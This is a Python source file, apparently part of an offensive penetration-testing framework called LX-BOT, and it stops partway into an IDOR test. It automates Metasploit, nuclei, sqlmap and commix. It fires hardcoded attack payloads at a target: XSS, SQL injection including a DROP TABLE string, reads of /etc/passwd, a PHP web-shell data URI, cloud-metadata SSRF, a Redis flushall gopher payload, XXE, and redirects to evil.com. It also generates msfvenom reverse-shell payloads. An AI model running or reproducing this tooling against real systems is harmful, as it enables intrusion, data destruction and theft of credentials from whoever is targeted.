#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════════════════╗
║            LX-BOT ULTIMATE v5.0 — ORCHESTRATOR & PHASES 6-10               ║
║       Next-Gen Enterprise Penetration Testing & Bug Bounty Framework        ║
║                                                                              ║
║  • Phase 6: Nuclei Vulnerability Scanning   (template-based, CVSS)          ║
║  • Phase 7: Injection Testing               (XSS/SQLi/LFI/SSTI/XXE/SSRF)   ║
║  • Phase 8: OSINT & Intelligence            (emails/GitHub/S3/breaches)     ║
║  • Phase 9: Exploit Research & CVE          (searchsploit/Metasploit)       ║
║  • Phase 10: Advanced Attacks               (race/auth-bypass/default-creds)║
║                                                                              ║
║  lx.py     ← Core Engine, Phases 1-5 (import)                              ║
║  lx-bot.py ← THIS FILE: Phases 6-10 + CLI + Orchestrator                   ║
╚══════════════════════════════════════════════════════════════════════════════╝

USAGE:
  python3 lx-bot.py -t https://target.com
  python3 lx-bot.py -t https://target.com --proxy http://127.0.0.1:8080
  python3 lx-bot.py -t https://target.com --skip-heavy --threads 25
  python3 lx-bot.py -t https://target.com --only-phases 1,2,3
  sudo python3 lx-bot.py -t https://target.com --full
"""

import os
import sys
import json
import re
import time
import asyncio
import argparse
import threading
from pathlib import Path
from datetime import datetime
from typing import Dict, List, Any, Optional, Tuple
from urllib.parse import urlparse

# ─── Import core engine ──────────────────────────────────────────────────────
try:
    from lx import (
        BANNER, VERSION, AUTHOR, YEAR,
        SEV_COLOR, OWASP_MAP, DEFAULT_CREDS,
        console, AsyncRunner, ResultsStore,
        print_phase_header, print_finding, print_ok, print_warn,
        print_err, print_info, print_tool, severity_bar,
        extract_domain, normalise_url, tool_exists,
        parse_nuclei_output, scan_js_secrets,
        Phase1Recon, Phase2Ports, Phase3Web, Phase4API, Phase5Content,
    )
except ImportError as e:
    print(f'[ERROR] Cannot import lx.py: {e}')
    print('Ensure lx.py is in the same directory.')
    sys.exit(1)

# ─── Rich imports ────────────────────────────────────────────────────────────
from rich.console import Console
from rich.panel import Panel
from rich.table import Table
from rich.progress import (
    Progress, SpinnerColumn, TextColumn, BarColumn,
    TimeElapsedColumn, TaskProgressColumn
)
from rich.rule import Rule
from rich import box
from rich.markup import escape

# ─── report_generator import ─────────────────────────────────────────────────
try:
    from report_generator import UltimateReportGenerator
    HAS_REPORT_GEN = True
except ImportError:
    HAS_REPORT_GEN = False


# ═══════════════════════════════════════════════════════════════════════════
# METASPLOIT INTEGRATION
# ═══════════════════════════════════════════════════════════════════════════

class MetasploitIntegration:
    """
    Metasploit Framework automation for exploit research and module correlation.
    Integrates with searchsploit, msfconsole, and msfvenom.
    """

    def __init__(self, runner: AsyncRunner):
        self.runner = runner

    async def search_modules(self, search_term: str) -> List[Dict[str, Any]]:
        """Search Metasploit database for exploit modules."""
        if not tool_exists('msfconsole'):
            return []
        print_tool('msfconsole', f'Searching modules: {search_term[:50]}')
        rc, out, _ = await self.runner.run(
            f'msfconsole -q -x "search {search_term}; exit" 2>/dev/null',
            timeout=120, tag='msf-search'
        )
        modules = []
        for line in out.splitlines():
            m = re.match(
                r'\s*\d+\s+(exploit|auxiliary|post|scanner)/(\S+)\s+'
                r'(\d{4}-\d{2}-\d{2})\s+(\S+)\s+(excellent|great|good|normal|average|low|manual)\s+(.*)',
                line, re.IGNORECASE
            )
            if m:
                modules.append({
                    'type':        m.group(1),
                    'path':        f'{m.group(1)}/{m.group(2)}',
                    'date':        m.group(3),
                    'check':       m.group(4),
                    'rank':        m.group(5).lower(),
                    'description': m.group(6).strip(),
                })
        return modules

    async def searchsploit_lookup(self, query: str) -> List[Dict[str, Any]]:
        """Search Exploit-DB with searchsploit."""
        if not tool_exists('searchsploit'):
            return []
        print_tool('searchsploit', f'Exploit search: {query[:50]}')
        rc, out, _ = await self.runner.run(
            f'searchsploit --json "{query}" 2>/dev/null',
            timeout=60, tag='searchsploit'
        )
        results = []
        try:
            data = json.loads(out) if out.strip() else {}
            for entry in data.get('RESULTS_EXPLOIT', []):
                results.append({
                    'id':       entry.get('EDB-ID', ''),
                    'title':    entry.get('Title', ''),
                    'type':     entry.get('Type', ''),
                    'platform': entry.get('Platform', ''),
                    'date':     entry.get('Date', ''),
                    'path':     entry.get('Path', ''),
                    'url':      f'https://www.exploit-db.com/exploits/{entry.get("EDB-ID", "")}',
                })
        except (json.JSONDecodeError, KeyError):
            # Fallback: parse text output
            for line in out.splitlines():
                if '|' in line and not line.startswith('-'):
                    parts = line.split('|')
                    if len(parts) >= 2:
                        results.append({
                            'title': parts[0].strip()[:80],
                            'path':  parts[-1].strip(),
                        })
        return results

    async def generate_payload(
        self,
        payload_type: str,
        lhost: str,
        lport: int = 4444,
        format_: str = 'elf',
        outdir: Path = Path('/tmp'),
    ) -> Optional[str]:
        """Generate a payload with msfvenom."""
        if not tool_exists('msfvenom'):
            return None

        outfile = str(outdir / f'payload_{int(time.time())}.{format_}')
        rc, out, _ = await self.runner.run(
            f'msfvenom -p {payload_type} '
            f'LHOST={lhost} LPORT={lport} '
            f'-f {format_} -o {outfile} 2>/dev/null',
            timeout=60, tag='msfvenom'
        )
        if rc == 0 and Path(outfile).exists():
            print_ok(f'msfvenom: payload generated → {outfile}')
            return outfile
        return None

    async def check_exploit(self, module_path: str, target: str) -> Optional[str]:
        """Run check against a target for a specific Metasploit module."""
        if not tool_exists('msfconsole'):
            return None
        rc, out, _ = await self.runner.run(
            f'msfconsole -q -x "use {module_path}; set RHOSTS {target}; check; exit" 2>/dev/null',
            timeout=120, tag='msf-check'
        )
        if 'The target appears to be vulnerable' in out:
            return 'VULNERABLE'
        elif 'The target is not exploitable' in out:
            return 'NOT_VULNERABLE'
        return 'UNKNOWN'


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 6 — NUCLEI VULNERABILITY SCANNING
# ═══════════════════════════════════════════════════════════════════════════

class Phase6Nuclei:
    """
    Phase 6: Template-based vulnerability detection with Nuclei.
    Runs severity-tiered template sets across all live hosts.
    Also integrates jaeles for additional coverage.
    """

    def __init__(
        self,
        runner:  AsyncRunner,
        store:   ResultsStore,
        proxy:   Optional[str] = None,
        threads: int = 25,
    ):
        self.runner  = runner
        self.store   = store
        self.proxy   = proxy
        self.threads = threads
        self.domain  = store.domain
        self.target  = store.target
        self.outdir  = store.output_dir

    async def run(self):
        print_phase_header(
            6, 'NUCLEI TEMPLATE-BASED SCANNING',
            ['nuclei', 'jaeles']
        )
        await self._update_templates()
        live_hosts = self.store.get('live_hosts', [])
        targets = [
            h.get('url', h) if isinstance(h, dict) else h
            for h in live_hosts
        ] or [self.target]

        # Write targets file
        targets_file = self.outdir / 'targets.txt'
        targets_file.write_text('\n'.join(targets[:50]), encoding='utf-8')

        await asyncio.gather(
            self._nuclei_critical_high(targets_file),
            self._nuclei_medium_low(targets_file),
            self._nuclei_exposures(targets_file),
            self._nuclei_cves(targets_file),
            self._nuclei_misconfiguration(targets_file),
        )

        await self._jaeles(targets_file)
        self._print_summary()

    async def _update_templates(self):
        if tool_exists('nuclei'):
            print_info('Updating Nuclei templates...')
            await self.runner.run('nuclei -ut -silent 2>/dev/null', timeout=60, tag='nuclei-update')

    async def _nuclei_run(self, targets_file: Path, tags: str, severity: str, outfile: Path):
        if not tool_exists('nuclei'):
            return
        proxy_opt = f'-proxy {self.proxy}' if self.proxy else ''
        rc, out, _ = await self.runner.run(
            f'nuclei -l {targets_file} '
            f'-severity {severity} '
            f'-tags {tags} '
            f'-concurrency {self.threads} '
            f'-rate-limit 150 '
            f'-timeout 10 '
            f'-retries 2 '
            f'-jsonl -o {outfile} '
            f'{proxy_opt} 2>/dev/null',
            timeout=900, tag=f'nuclei-{severity}'
        )
        self._process_nuclei_output(out, str(outfile))

    def _process_nuclei_output(self, output: str, outfile_path: str):
        """Parse and store nuclei findings."""
        all_output = output
        if Path(outfile_path).exists():
            all_output += '\n' + Path(outfile_path).read_text(encoding='utf-8', errors='replace')

        findings = parse_nuclei_output(all_output)
        for f in findings:
            self.store.add('nuclei_findings', f)
            sev = f.get('severity', 'info')
            if sev in ('critical', 'high', 'medium'):
                self.store.add_vuln({
                    'name':        f['name'],
                    'severity':    sev,
                    'url':         f.get('url', self.target),
                    'description': f.get('description', ''),
                    'cve':         f.get('cve', []),
                    'cvss_score':  f.get('cvss_score'),
                    'tool':        'nuclei',
                    'template_id': f.get('template_id', ''),
                    'tags':        f.get('tags', []),
                })
                if sev in ('critical', 'high'):
                    print_finding(sev, f['name'], f.get('url',''), f.get('description','')[:80])

    async def _nuclei_critical_high(self, targets_file: Path):
        print_tool('nuclei', 'Critical/High severity templates')
        outfile = self.outdir / 'nuclei_critical_high.jsonl'
        await self._nuclei_run(
            targets_file,
            tags='cve,rce,sqli,xss,ssrf,lfi,xxe,ssti,auth-bypass,default-login',
            severity='critical,high',
            outfile=outfile,
        )

    async def _nuclei_medium_low(self, targets_file: Path):
        print_tool('nuclei', 'Medium/Low severity templates')
        outfile = self.outdir / 'nuclei_medium.jsonl'
        await self._nuclei_run(
            targets_file,
            tags='misconfig,cors,headers,cookies,info-leak,open-redirect',
            severity='medium,low',
            outfile=outfile,
        )

    async def _nuclei_exposures(self, targets_file: Path):
        print_tool('nuclei', 'Exposure & disclosure templates')
        outfile = self.outdir / 'nuclei_exposures.jsonl'
        await self._nuclei_run(
            targets_file,
            tags='exposure,disclosure,backup,config,debug,login,panel',
            severity='critical,high,medium',
            outfile=outfile,
        )

    async def _nuclei_cves(self, targets_file: Path):
        print_tool('nuclei', 'CVE templates')
        outfile = self.outdir / 'nuclei_cves.jsonl'
        if not tool_exists('nuclei'):
            return
        proxy_opt = f'-proxy {self.proxy}' if self.proxy else ''
        rc, out, _ = await self.runner.run(
            f'nuclei -l {targets_file} -tags cve '
            f'-severity critical,high,medium '
            f'-concurrency {self.threads} -rate-limit 100 '
            f'-jsonl -o {outfile} {proxy_opt} 2>/dev/null',
            timeout=900, tag='nuclei-cves'
        )
        self._process_nuclei_output(out, str(outfile))

    async def _nuclei_misconfiguration(self, targets_file: Path):
        print_tool('nuclei', 'Misconfiguration detection')
        outfile = self.outdir / 'nuclei_misconfig.jsonl'
        await self._nuclei_run(
            targets_file,
            tags='misconfig,takeover,cnvd,self-signed,weak-cipher',
            severity='critical,high,medium,low',
            outfile=outfile,
        )

    async def _jaeles(self, targets_file: Path):
        if not tool_exists('jaeles'):
            return
        print_tool('jaeles', 'Advanced signature-based scanning')
        outfile = self.outdir / 'jaeles_output'
        rc, out, _ = await self.runner.run(
            f'jaeles scan -l {targets_file} '
            f'-c {self.threads} -L 3 '
            f'--output {outfile} 2>/dev/null',
            timeout=600, tag='jaeles'
        )
        for line in out.splitlines():
            if '[Vuln]' in line or '[Critical]' in line:
                self.store.add_vuln({
                    'name':     line.strip()[:80],
                    'severity': 'high',
                    'url':      self.target,
                    'tool':     'jaeles',
                })
                print_finding('high', line.strip()[:80], self.target)

    def _print_summary(self):
        findings = self.store.get('nuclei_findings', [])
        sev_counts = {}
        for f in findings:
            sev = f.get('severity', 'info')
            sev_counts[sev] = sev_counts.get(sev, 0) + 1

        tbl = Table(title='Phase 6 – Nuclei Summary', box=box.ROUNDED, border_style='cyan')
        tbl.add_column('Severity', style='bold')
        tbl.add_column('Count', justify='right')
        for sev, col in [('critical','red'),('high','orange1'),('medium','yellow'),('low','green'),('info','cyan')]:
            n = sev_counts.get(sev, 0)
            tbl.add_row(f'[{col}]{sev.upper()}[/{col}]', str(n))
        if findings:
            console.print(tbl)
        console.print(f'  [bold green]Nuclei total: {len(findings)} findings[/bold green]')


# ═══════════════════════════════════════════════════════════════════════════
# PHASE 7 — INJECTION TESTING
# ═══════════════════════════════════════════════════════════════════════════

class Phase7Injections:
    """
    Phase 7: Comprehensive injection vulnerability testing.
    Tools: sqlmap, dalfox, commix, nosqlmap, xsstrike, gf (patterns)
    Covers: XSS, SQLi, LFI, SSTI, XXE, SSRF, CMDi, Open Redirect, IDOR
    """

    def __init__(
        self,
        runner:  AsyncRunner,
        store:   ResultsStore,
        proxy:   Optional[str] = None,
        threads: int = 10,
    ):
        self.runner  = runner
        self.store   = store
        self.proxy   = proxy
        self.threads = threads
        self.domain  = store.domain
        self.target  = store.target
        self.outdir  = store.output_dir
        self._param_urls: List[str] = []

    async def run(self):
        print_phase_header(
            7, 'INJECTION TESTING',
            ['sqlmap', 'dalfox', 'xsstrike', 'commix', 'nosqlmap',
             'gf', 'LFI/SSTI/XXE/SSRF/IDOR manual probes']
        )
        await self._collect_param_urls()

        await asyncio.gather(
            self._xss_testing(),
            self._sqli_testing(),
            self._lfi_testing(),
            self._ssti_testing(),
            self._ssrf_testing(),
            self._xxe_testing(),
            self._open_redirect_testing(),
            self._cmdi_testing(),
        )

        await self._idor_testing()
        self._print_summary()

    async def _collect_param_urls(self):
        """Collect URLs with parameters for injection testing."""
        all_urls = (
            self.store.get('crawled_urls', []) +
            self.store.get('wayback_urls', []) +
            [e.get('url','') for e in self.store.get('api_endpoints', [])]
        )
        # Filter URLs with query parameters
        param_urls = [
            u for u in set(all_urls)
            if '?' in u and '=' in u and self.domain in u
        ]
        # Use gf patterns if available
        if tool_exists('gf') and all_urls:
            urls_file = self.outdir / 'all_urls.txt'
            urls_file.write_text('\n'.join(set(all_urls)), encoding='utf-8')
            for pattern in ['xss', 'sqli', 'lfi', 'ssrf', 'redirect', 'rce', 'ssti']:
                rc, out, _ = await self.runner.run(
                    f'cat {urls_file} | gf {pattern} 2>/dev/null',
                    timeout=30, tag=f'gf-{pattern}'
                )
                gf_urls = [l.strip() for l in out.splitlines() if l.strip()]
                param_urls.extend(gf_urls)

        self._param_urls = list(set(param_urls))[:200]
        print_info(f'Collected {len(self._param_urls)} parameterised URLs for injection testing')

    # ── XSS ───────────────────────────────────────────────────────────────

    async def _xss_testing(self):
        print_tool('dalfox', 'XSS vulnerability testing')
        xss_results = []

        if not self._param_urls:
            await self._xss_manual()
            return

        if tool_exists('dalfox'):
            urls_file = self.outdir / 'param_urls.txt'
            xss_urls = self._param_urls[:100]
            urls_file.write_text('\n'.join(xss_urls), encoding='utf-8')
            proxy_opt = f'--proxy {self.proxy}' if self.proxy else ''
            rc, out, _ = await self.runner.run(
                f'dalfox file {urls_file} '
                f'--worker {self.threads} '
                f'--timeout 10 '
                f'--output {self.outdir}/dalfox.txt '
                f'{proxy_opt} 2>/dev/null',
                timeout=600, tag='dalfox'
            )
            for line in out.splitlines():
                if '[V]' in line or '[POC]' in line or 'VULN' in line.upper():
                    url_match = re.search(r'https?://\S+', line)
                    found_url = url_match.group(0) if url_match else self.target
                    entry = {
                        'name':     'Cross-Site Scripting (XSS)',
                        'severity': 'high',
                        'url':      found_url,
                        'tool':     'dalfox',
                        'detail':   line.strip()[:200],
                    }
                    xss_results.append(entry)
                    self.store.add_vuln(entry)
                    print_finding('high', 'XSS Found!', found_url, line.strip()[:80])

        elif tool_exists('xsstrike') or tool_exists('XSStrike'):
            await self._xsstrike()

        self.store.add('xss_results', xss_results)
        print_ok(f'XSS testing: {len(xss_results)} vulnerabilities found')

    async def _xsstrike(self):
        xsstrike_bin = 'xsstrike' if tool_exists('xsstrike') else 'XSStrike'
        for url in self._param_urls[:20]:
            proxy_opt = f'--proxy {self.proxy}' if self.proxy else ''
            rc, out, _ = await self.runner.run(
                f'python3 {xsstrike_bin} -u "{url}" --blind --skip --skip-dom '
                f'--timeout 10 {proxy_opt} 2>/dev/null',
                timeout=120, tag='xsstrike'
            )
            if 'XSS Found' in out or 'Payload' in out:
                self.store.add_vuln({
                    'name':     'Cross-Site Scripting (XSS)',
                    'severity': 'high',
                    'url':      url,
                    'tool':     'xsstrike',
                })
                print_finding('high', 'XSS Found!', url)

    async def _xss_manual(self):
        """Blind XSS probe on form inputs."""
        xss_payloads = [
            '<script>alert(1)</script>',
            '"><script>alert(1)</script>',
            "'><img src=x onerror=alert(1)>",
            '{{7*7}}',
            '<svg onload=alert(1)>',
        ]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        for payload in xss_payloads[:2]:
            encoded = payload.replace(' ', '%20').replace('<', '%3C').replace('>', '%3E')
            rc, out, _ = await self.runner.run(
                f'curl -sk --max-time 10 {proxy_opt} '
                f'"{self.target}?q={encoded}&search={encoded}&id={encoded}" 2>/dev/null',
                timeout=15, tag='xss-manual'
            )
            if re.search(re.escape(payload[:15]), out, re.IGNORECASE):
                self.store.add_vuln({
                    'name':        'Reflected XSS (Parameter Reflection)',
                    'severity':    'high',
                    'url':         self.target,
                    'description': f'Payload reflected in response: {payload[:40]}',
                    'tool':        'xss-manual',
                })
                print_finding('high', 'Reflected XSS!', self.target, payload[:40])

    # ── SQL Injection ─────────────────────────────────────────────────────

    async def _sqli_testing(self):
        print_tool('sqlmap', 'SQL injection detection & exploitation')
        sqli_results = []

        if not tool_exists('sqlmap'):
            await self._sqli_manual()
            return

        proxy_opt = f'--proxy={self.proxy}' if self.proxy else ''
        target_urls = self._param_urls[:30] or [self.target]

        for url in target_urls[:10]:
            outfile = self.outdir / f'sqlmap_{hash(url) & 0xFFFF}.txt'
            rc, out, _ = await self.runner.run(
                f'sqlmap -u "{url}" '
                f'--batch --level=2 --risk=2 '
                f'--random-agent '
                f'--threads={self.threads} '
                f'--timeout=15 '
                f'--technique=BEUST '
                f'--output-dir={self.outdir}/sqlmap '
                f'{proxy_opt} 2>/dev/null',
                timeout=300, tag='sqlmap'
            )
            if 'is vulnerable' in out.lower() or 'sql injection' in out.lower():
                entry = {
                    'name':        'SQL Injection',
                    'severity':    'critical',
                    'url':         url,
                    'tool':        'sqlmap',
                    'description': out[:300],
                }
                sqli_results.append(entry)
                self.store.add_vuln(entry)
                print_finding('critical', 'SQL INJECTION FOUND!', url)

        # NoSQL
        if tool_exists('nosqlmap') or (self.outdir / '../nosqlmap').exists():
            await self._nosqlmap()

        self.store.add('sqli_results', sqli_results)
        print_ok(f'SQLi testing: {len(sqli_results)} injections found')

    async def _sqli_manual(self):
        """Basic SQLi probe using curl."""
        sqli_payloads = ["'", "1' OR '1'='1", "1; DROP TABLE users--", "1 UNION SELECT 1,2,3--"]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        error_patterns = [
            r'SQL syntax', r'mysql_fetch', r'ORA-\d+', r'PostgreSQL',
            r'sqlite_', r'Microsoft SQL', r'SQLSTATE', r'Unclosed quotation',
        ]
        for url in (self._param_urls[:5] or [self.target + '?id=1']):
            for payload in sqli_payloads[:2]:
                test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 10 {proxy_opt} "{test_url}" 2>/dev/null',
                    timeout=15, tag='sqli-manual'
                )
                for pat in error_patterns:
                    if re.search(pat, out, re.IGNORECASE):
                        self.store.add_vuln({
                            'name':        'SQL Injection (Error-Based)',
                            'severity':    'critical',
                            'url':         test_url,
                            'description': f'DB error in response to payload: {payload}',
                            'tool':        'sqli-manual',
                        })
                        print_finding('critical', 'SQL Injection (error-based)!', test_url)
                        break

    async def _nosqlmap(self):
        print_tool('nosqlmap', 'NoSQL injection testing')
        for url in self._param_urls[:5]:
            rc, out, _ = await self.runner.run(
                f'python3 /opt/nosqlmap/nosqlmap.py --url "{url}" --attack 1 2>/dev/null || '
                f'python3 ~/nosqlmap/nosqlmap.py --url "{url}" --attack 1 2>/dev/null',
                timeout=120, tag='nosqlmap'
            )
            if 'injection' in out.lower() or 'vulnerable' in out.lower():
                self.store.add_vuln({
                    'name':     'NoSQL Injection',
                    'severity': 'high',
                    'url':      url,
                    'tool':     'nosqlmap',
                })
                print_finding('high', 'NoSQL Injection!', url)

    # ── LFI / Path Traversal ──────────────────────────────────────────────

    async def _lfi_testing(self):
        print_tool('lfi-probe', 'Local File Inclusion / Path Traversal')
        lfi_payloads = [
            '../../../etc/passwd',
            '..%2F..%2F..%2Fetc%2Fpasswd',
            '....//....//....//etc/passwd',
            '/etc/passwd',
            '../../../windows/win.ini',
            '..\\..\\..\\windows\\win.ini',
            '%00../../../etc/passwd',
            'php://filter/read=convert.base64-encode/resource=/etc/passwd',
            'php://input',
            'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7',
        ]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        lfi_results = []
        lfi_indicators = [
            'root:x:', 'root:!:', '[extensions]', 'Windows',
            'bin/bash', 'daemon:x:', 'passwd', 'shadow',
        ]
        test_urls = [u for u in self._param_urls if re.search(r'(file|path|page|include|load|template)', u, re.IGNORECASE)]
        test_urls = (test_urls or self._param_urls)[:20]

        for url in test_urls:
            for payload in lfi_payloads[:6]:
                test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 10 {proxy_opt} "{test_url}" 2>/dev/null',
                    timeout=15, tag='lfi'
                )
                for indicator in lfi_indicators:
                    if indicator.lower() in out.lower():
                        entry = {
                            'name':        'Local File Inclusion',
                            'severity':    'critical',
                            'url':         test_url,
                            'description': f'Payload "{payload}" leaked system content',
                            'tool':        'lfi-probe',
                        }
                        lfi_results.append(entry)
                        self.store.add_vuln(entry)
                        print_finding('critical', 'LFI / Path Traversal!', test_url, payload[:40])
                        break

        self.store.add('lfi_rfi_results', lfi_results)
        print_ok(f'LFI testing: {len(lfi_results)} findings')

    # ── SSTI ──────────────────────────────────────────────────────────────

    async def _ssti_testing(self):
        print_tool('ssti-probe', 'Server-Side Template Injection')
        ssti_payloads = {
            '{{7*7}}':              '49',
            '${7*7}':              '49',
            '<%= 7*7 %>':         '49',
            '#{7*7}':             '49',
            '*{7*7}':             '49',
            '{{7*\'7\'}}':        '7777777',
            '${{<%[%\'"}}%\\':    'error',
            '{{config}}':         'SECRET_KEY',
            '{{self.__dict__}}':  '__dict__',
        }
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        ssti_results = []

        test_urls = self._param_urls[:20]
        for url in test_urls:
            for payload, expected in list(ssti_payloads.items())[:5]:
                test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 10 {proxy_opt} "{test_url}" 2>/dev/null',
                    timeout=15, tag='ssti'
                )
                if expected in out and expected not in ['error']:
                    entry = {
                        'name':        'Server-Side Template Injection (SSTI)',
                        'severity':    'critical',
                        'url':         test_url,
                        'description': f'Payload "{payload}" evaluated → "{expected}" in response',
                        'tool':        'ssti-probe',
                    }
                    ssti_results.append(entry)
                    self.store.add_vuln(entry)
                    print_finding('critical', 'SSTI FOUND!', test_url, f'Payload: {payload}')
                    break

        self.store.add('ssti_results', ssti_results)
        print_ok(f'SSTI testing: {len(ssti_results)} findings')

    # ── SSRF ──────────────────────────────────────────────────────────────

    async def _ssrf_testing(self):
        print_tool('ssrf-probe', 'Server-Side Request Forgery')
        ssrf_payloads = [
            'http://169.254.169.254/latest/meta-data/',
            'http://169.254.169.254/latest/user-data/',
            'http://metadata.google.internal/computeMetadata/v1/',
            'http://100.100.100.200/latest/meta-data/',
            'http://127.0.0.1/',
            'http://localhost/',
            'http://[::1]/',
            'http://0.0.0.0/',
            'file:///etc/passwd',
            'dict://127.0.0.1:6379/info',
            'gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a',
        ]
        ssrf_indicators = [
            'ami-id', 'instance-id', 'local-hostname', 'public-ipv4',
            'metadata.google', 'computeMetadata', 'root:x:',
            'INFO', 'redis_version', 'Connected_slaves',
        ]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        ssrf_results = []

        ssrf_params = [u for u in self._param_urls if re.search(
            r'(url|uri|path|src|dest|redirect|goto|host|domain|api|endpoint|callback|feed|to|next)',
            u, re.IGNORECASE
        )]
        test_urls = (ssrf_params or self._param_urls)[:15]

        for url in test_urls:
            for payload in ssrf_payloads[:5]:
                test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 12 {proxy_opt} "{test_url}" 2>/dev/null',
                    timeout=20, tag='ssrf'
                )
                for indicator in ssrf_indicators:
                    if indicator.lower() in out.lower():
                        entry = {
                            'name':        'Server-Side Request Forgery (SSRF)',
                            'severity':    'critical',
                            'url':         test_url,
                            'description': f'SSRF to "{payload}" leaked: {indicator}',
                            'tool':        'ssrf-probe',
                        }
                        ssrf_results.append(entry)
                        self.store.add_vuln(entry)
                        print_finding('critical', 'SSRF FOUND!', test_url, f'Internal data leaked!')
                        break

        self.store.add('ssrf_results', ssrf_results)
        print_ok(f'SSRF testing: {len(ssrf_results)} findings')

    # ── XXE ──────────────────────────────────────────────────────────────

    async def _xxe_testing(self):
        print_tool('xxe-probe', 'XML External Entity Injection')
        xxe_payloads = [
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]><foo>&xxe;</foo>',
            '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY % xxe SYSTEM "file:///etc/passwd">%xxe;]><foo/>',
        ]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        xxe_results = []
        indicators = ['root:x:', 'daemon:x:', 'bin:x:', 'ami-id']

        # Find XML / JSON accepting endpoints
        xml_endpoints = [
            url for url in self.store.get('api_endpoints', [])
            if isinstance(url, dict) and 'xml' in url.get('content_type','').lower()
        ]
        if not xml_endpoints:
            xml_endpoints = [{'url': self.target + '/api'}]

        for ep in xml_endpoints[:3]:
            ep_url = ep.get('url', '') if isinstance(ep, dict) else ep
            for payload in xxe_payloads[:2]:
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 12 {proxy_opt} '
                    f'-X POST -H "Content-Type: application/xml" '
                    f'-d \'{payload}\' "{ep_url}" 2>/dev/null',
                    timeout=20, tag='xxe'
                )
                for indicator in indicators:
                    if indicator in out:
                        entry = {
                            'name':        'XML External Entity (XXE) Injection',
                            'severity':    'critical',
                            'url':         ep_url,
                            'description': 'XXE payload successfully read internal files',
                            'tool':        'xxe-probe',
                        }
                        xxe_results.append(entry)
                        self.store.add_vuln(entry)
                        print_finding('critical', 'XXE INJECTION FOUND!', ep_url)
                        break

        self.store.add('xxe_results', xxe_results)
        print_ok(f'XXE testing: {len(xxe_results)} findings')

    # ── Open Redirect ─────────────────────────────────────────────────────

    async def _open_redirect_testing(self):
        print_tool('redirect-probe', 'Open Redirect detection')
        redirect_payloads = [
            'https://evil.com',
            '//evil.com',
            '/\\evil.com',
            '///evil.com',
            'https://evil.com%2F@target.com',
            '\x00https://evil.com',
        ]
        redirect_params = [u for u in self._param_urls if re.search(
            r'(redirect|url|next|goto|forward|dest|destination|redir|return|returnUrl|back)',
            u, re.IGNORECASE
        )]
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        results = []

        for url in (redirect_params or self._param_urls)[:20]:
            for payload in redirect_payloads[:4]:
                test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                rc, out, _ = await self.runner.run(
                    f'curl -sk --max-time 8 {proxy_opt} -I '
                    f'"{test_url}" 2>/dev/null',
                    timeout=12, tag='redirect'
                )
                if re.search(r'location:\s*https?://evil\.com', out, re.IGNORECASE):
                    entry = {
                        'name':        'Open Redirect',
                        'severity':    'medium',
                        'url':         test_url,
                        'description': f'Redirect to external URL via: {payload}',
                        'tool':        'redirect-probe',
                    }
                    results.append(entry)
                    self.store.add_vuln(entry)
                    print_finding('medium', 'Open Redirect!', test_url, payload)
                    break

        self.store.add('open_redirects', results)
        print_ok(f'Open Redirect: {len(results)} findings')

    # ── Command Injection ─────────────────────────────────────────────────

    async def _cmdi_testing(self):
        print_tool('commix', 'Command injection testing')
        cmdi_results = []

        if tool_exists('commix'):
            proxy_opt = f'--proxy={self.proxy}' if self.proxy else ''
            for url in self._param_urls[:10]:
                rc, out, _ = await self.runner.run(
                    f'commix --url="{url}" --batch --level=2 '
                    f'--timeout=15 {proxy_opt} 2>/dev/null',
                    timeout=300, tag='commix'
                )
                if 'is vulnerable' in out.lower() or 'Backdoor' in out:
                    entry = {
                        'name':        'OS Command Injection',
                        'severity':    'critical',
                        'url':         url,
                        'description': 'commix detected command injection vulnerability',
                        'tool':        'commix',
                    }
                    cmdi_results.append(entry)
                    self.store.add_vuln(entry)
                    print_finding('critical', 'COMMAND INJECTION!', url)
        else:
            # Manual probes
            payloads = [';id', '|id', '`id`', '$(id)', '& id &', '; sleep 5;']
            proxy_opt = f'-x {self.proxy}' if self.proxy else ''
            for url in self._param_urls[:10]:
                for payload in payloads[:3]:
                    test_url = re.sub(r'=([^&]*)', f'={payload}', url, count=1)
                    rc, out, _ = await self.runner.run(
                        f'curl -sk --max-time 10 {proxy_opt} "{test_url}" 2>/dev/null',
                        timeout=15, tag='cmdi-manual'
                    )
                    if re.search(r'uid=\d+\([a-z]+\)', out):
                        entry = {
                            'name':        'OS Command Injection (RCE)',
                            'severity':    'critical',
                            'url':         test_url,
                            'description': f'Command output in response: {out[:100]}',
                            'tool':        'cmdi-manual',
                        }
                        cmdi_results.append(entry)
                        self.store.add_vuln(entry)
                        print_finding('critical', 'RCE via Command Injection!', test_url)
                        break

        self.store.add('command_injection', cmdi_results)
        print_ok(f'CMDi testing: {len(cmdi_results)} findings')

    # ── IDOR ──────────────────────────────────────────────────────────────

    async def _idor_testing(self):
        print_tool('idor-probe', 'Insecure Direct Object Reference (IDOR)')
        proxy_opt = f'-x {self.proxy}' if self.proxy else ''
        idor_results = []

        # Find URLs with numeric IDs
        id_urls = [
            u for u in self._param_urls
            if re.search(r'(id|user_id|uid|account|profile|document|file|order)=\d+', u, re.IGNORECASE)
        ]

